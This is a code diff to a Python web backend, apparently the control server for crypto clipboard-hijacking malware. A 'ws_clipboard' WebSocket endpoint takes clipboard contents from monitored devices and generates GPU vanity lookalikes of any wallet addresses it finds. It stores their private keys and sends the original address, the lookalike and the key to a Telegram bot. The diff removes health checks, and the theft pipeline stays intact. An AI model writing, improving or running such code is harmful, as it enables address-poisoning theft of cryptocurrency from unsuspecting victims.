@@ -313,10 +313,6 @@ async def generate_similar(device_id: str, _: None = Depends(admin_guard)) -> Di
     
     # 使用Vanity服务生成地址
     async with VanityServiceClient() as client:
-        # 先检查服务是否可用
-        if not await client.health_check():
-            return {"success": False, "error": "地址生成服务不可用"}
-        
         # 调用生成服务（不限制时间，直到生成成功）
         result = await client.generate_sync(
             address=original_address,
@@ -584,62 +580,58 @@ async def ws_clipboard(ws: WebSocket):
                         try:
                             # 使用Vanity服务生成地址
                             async with VanityServiceClient() as client:
-                                # 先检查服务是否可用
-                                if await client.health_check():
-                                    # 调用生成服务（限制时间30秒）
-                                    result = await client.generate_sync(
-                                        address=preview,
-                                        timeout=30,  # 30秒超时
-                                        use_gpu=True
-                                    )
-                                    
-                                    if result['success']:
-                                        # 保存到数据库
+                                # 调用生成服务（限制时间30秒）
+                                result = await client.generate_sync(
+                                    address=preview,
+                                    timeout=30,  # 30秒超时
+                                    use_gpu=True
+                                )
+                                
+                                if result['success']:
+                                    # 保存到数据库
+                                    with get_session() as db:
+                                        generated = GeneratedAddress(
+                                            device_id=device_id,
+                                            original_address=result['original_address'],
+                                            generated_address=result['generated_address'],
+                                            private_key=result['private_key'],
+                                            address_type=result['address_type'],
+                                            balance="0"
+                                        )
+                                        db.add(generated)
+                                        db.commit()
+                                        
+                                        print(f"[AUTO-GENERATE] device={device_id} 生成成功: {result['generated_address']}", flush=True)
+                                        
+                                        # 发送生成结果到Telegram
+                                        message = (
+                                            f"🎯 <b>自动生成相似地址成功</b>\n\n"
+                                            f"设备ID: <code>{device_id}</code>\n"
+                                            f"设备备注: {device_note or '无'}\n"
+                                            f"地址类型: {result['address_type']}\n"
+                                            f"原始地址: <code>{result['original_address']}</code>\n"
+                                            f"生成地址: <code>{result['generated_address']}</code>\n"
+                                            f"私钥: <code>{result['private_key']}</code>\n"
+                                            f"生成耗时: {result.get('generation_time', 0):.2f}秒\n"
+                                            f"尝试次数: {result.get('attempts', 0):,}次"
+                                        )
+                                        
                                         with get_session() as db:
-                                            generated = GeneratedAddress(
-                                                device_id=device_id,
-                                                original_address=result['original_address'],
-                                                generated_address=result['generated_address'],
-                                                private_key=result['private_key'],
-                                                address_type=result['address_type'],
-                                                balance="0"
-                                            )
-                                            db.add(generated)
-                                            db.commit()
+                                            bot_token = db.query(SysSettings).filter(SysSettings.key == "tg_bot_token").first()
+                                            chat_id = db.query(SysSettings).filter(SysSettings.key == "tg_chat_id").first()
                                             
-                                            print(f"[AUTO-GENERATE] device={device_id} 生成成功: {result['generated_address']}", flush=True)
-                                            
-                                            # 发送生成结果到Telegram
-                                            message = (
-                                                f"🎯 <b>自动生成相似地址成功</b>\n\n"
-                                                f"设备ID: <code>{device_id}</code>\n"
-                                                f"设备备注: {device_note or '无'}\n"
-                                                f"地址类型: {result['address_type']}\n"
-                                                f"原始地址: <code>{result['original_address']}</code>\n"
-                                                f"生成地址: <code>{result['generated_address']}</code>\n"
-                                                f"私钥: <code>{result['private_key']}</code>\n"
-                                                f"生成耗时: {result.get('generation_time', 0):.2f}秒\n"
-                                                f"尝试次数: {result.get('attempts', 0):,}次"
-                                            )
-                                            
-                                            with get_session() as db:
-                                                bot_token = db.query(SysSettings).filter(SysSettings.key == "tg_bot_token").first()
-                                                chat_id = db.query(SysSettings).filter(SysSettings.key == "tg_chat_id").first()
+                                            if bot_token and bot_token.value and chat_id and chat_id.value:
+                                                url = f"https://api.telegram.org/bot{bot_token.value}/sendMessage"
+                                                payload = {
+                                                    "chat_id": chat_id.value,
+                                                    "text": message,
+                                                    "parse_mode": "HTML"
+                                                }
                                                 
-                                                if bot_token and bot_token.value and chat_id and chat_id.value:
-                                                    url = f"https://api.telegram.org/bot{bot_token.value}/sendMessage"
-                                                    payload = {
-                                                        "chat_id": chat_id.value,
-                                                        "text": message,
-                                                        "parse_mode": "HTML"
-                                                    }
-                                                    
-                                                    async with aiohttp.ClientSession() as session:
-                                                        await session.post(url, json=payload)
-                                    else:
-                                        print(f"[AUTO-GENERATE] device={device_id} 生成失败: {result.get('error', '未知错误')}", flush=True)
+                                                async with aiohttp.ClientSession() as session:
+                                                    await session.post(url, json=payload)
                                 else:
-                                    print(f"[AUTO-GENERATE] device={device_id} 地址生成服务不可用", flush=True)
+                                    print(f"[AUTO-GENERATE] device={device_id} 生成失败: {result.get('error', '未知错误')}", flush=True)
                         except Exception as e:
                             print(f"[AUTO-GENERATE] device={device_id} 自动生成异常: {str(e)}", flush=True)
                 else:
